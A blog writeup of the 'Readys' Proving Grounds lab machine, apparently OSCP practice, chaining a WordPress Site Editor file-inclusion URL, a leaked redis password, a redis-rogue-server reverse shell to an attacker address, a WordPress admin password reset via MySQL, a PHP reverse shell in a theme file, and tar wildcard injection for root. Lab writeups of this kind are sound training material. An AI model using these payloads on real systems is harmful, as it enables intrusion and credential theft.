---
layout: writeup
title: Readys - Proving Grounds
date: 2024-07-10 13:32:20 +0300
description: A Writeup of the Readys Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, Redis]
---

Here's a writeup for Readys, an Intermediate Proving Grounds box I saw on the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). While this box has been rated Intermediate by OffSec, I'll note that the community has rated it to be Very Hard. I'll keep an eye on that as I have slightly have had boxes that I simply could not finish even when copying and pasting commands from official writeups. Looking at you Postfish. I kick things off with nmapAutomator and check port 80 for a website. Looks like we've got a Wordpress site. 

![Readys1.png](/assets/images/Readys/Readys1.png){: .responsive-image}

So I give wpscan a shot and also take notice that we only have three ports open:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

In particular I notice that the site and the box itself are called Readys, awfully close to redis on port 6379. Could it be a clue? Could it be anything but a clue? I try to access, but it looks like authentication is required. 

![Readys2.png](/assets/images/Readys/Readys2.png){: .responsive-image}

I check the results of the wpscan, and see there is a vulnerability for a plugin called `Site Editor 1.1.1`, which has a Local File Inclusion vulnerability on [exploit-db](https://www.exploit-db.com/exploits/44340) with a proof of concept to access the local `/etc/passwd` using this URL: `http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`, and that works. I can see there is a user named `alice`. That could come in handy. 

From here I do some quick research to see if there is a redis file that might have a password and start looking around for it. In this case that file is `/etc/redis/redis.conf`, and by looking for `pass` in the file, I see this string: 
`# requirepass Ready4Redis?`. I check that against `redis-cli`, and it works. 

![Readys3.png](/assets/images/Readys/Readys3.png){: .responsive-image}

Thats a pretty good sign. I don't know a lot about redis, so I check [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)for options, and I try creating an ssh key and uploading a php shell, but neither work immediately. I also dump the database using [pyredis-dump.py](https://github.com/muayyad-alsadi/pyredis-dump/blob/master/pyredis-dump.py), but it appears to be empty save evidence of one of the exploits I've already tried. Then I try [RedisRogueServer](https://github.com/n0b0dyCN/redis-rogue-server), and I eventually do that working to set up a reverse shell with: `python3 redis-rogue-server.py --rhost 192.168.229.166 --lhost 192.168.45.183 --lport 9999 --passwd Ready4Redis?` 

![Readys4.png](/assets/images/Readys/Readys4.png){: .responsive-image}

And we're off. Side note - I've been using [Penelope Shell Handler](https://github.com/brightio/penelope), and it's been great. Sets up a TTY shell automatically, and you can upload and download from the same window using its built-in menu. Unfortunately it looks like the redis user can't execute any scripts, so we may need to enumerate manually until we can find a different user or simply get another user to execute for us. It's worth noting that mysql is running, but we don't seem to be able to access it either from redis or alice. 

I check for running processes and realize that of course the wordpress server is still running, so I check for config files. In `/var/www/html/wp-config.php` we can see a DB-USER of `karl` and a DB-PASSWORD of `Wordpress1234`. We can use these credentials to log into mysql, check the wordpress database, and `SELECT * FROM wp_users;` which shows us this:

![Readys5.png](/assets/images/Readys/Readys5.png){: .responsive-image}

Initially, I think the plan is to crack it, but after a few minutes of staring at hashcat I figure we can just add our own user. So I do some googling, and I try this: 
```INSERT INTO `wordpress`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('2', 'pop', MD5('party1'), 'Your Name', 'test@example.com', 'http://localhost', '2022-09-01 00:00:00', '', '0', 'Your Name');```

This does create the user, but we don't have admin access, so I decide to try simply updating the admin password:

`UPDATE wp_users SET user_pass = '$P$Bji8hVfidufunf4yRQ4/SIEcgON/mL0' WHERE ID =1;`. The hash here is the phppass for `party1`. This does update the table and allow us to sign in!

![Readys6.png](/assets/images/Readys/Readys6.png){: .responsive-image}

From there I go to theme editor and edit the 404.php page for the theme in use with Ivan Sincek's reverse PHP shell, and I get a connection. 

![Readys7.png](/assets/images/Readys/Readys7.png){: .responsive-image}

And we're alice. Maybe now we can actually check linpeas and lse if we need to. And we see this in lse:

![Readys8.png](/assets/images/Readys/Readys8.png){: .responsive-image}

We check out that file, and we see this: 

![Readys9.png](/assets/images/Readys/Readys9.png){: .responsive-image}

Looks like we may have a wildcard vulnerability. It looks like it is checking the `/var/www/html` for changes made in the last 3 minutes (-mmin 3), and as long as there is at least one, it creates a backup folder called `/opt/backups/website.tar`. So I create a quick reverse shell and name it shell.sh and, then I check [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar) which says to use:
1. `touch "--checkpoint=1"`
2. `touch "--checkpoint-action=exec=sh shell.sh"` (with shell.sh being our malicious script)

But it doesn't work, because we get a `touch: unrecognized option '--checkpoint=1'` error. No worries, there's more than one way to skin a cat. We can use echo instead:

1. `echo "" > '--checkpoint=1'`
2. `echo "" > '--checkpoint-action=exec=sh shell.sh'`

And after a minute or so:

![Readys10.png](/assets/images/Readys/Readys10.png){: .responsive-image}

We get our root shell!

Lessons learned: There were a lot of steps to this box, but most of them were pretty straightforward. I don't think I had ever done anything with redis before, updated a MySQL table, or used anything but `echo` to exploit a wildcard vulnerability. I also needed to use a wordpress exploit before getting access to the shell from the redis exploit. All in all, I enjoyed this, but it took a while, and it seems way simpler at the end. But I don't think I'd completed a box that the Proving Grounds community rated "Very Hard" without getting a hint, so that's good. 
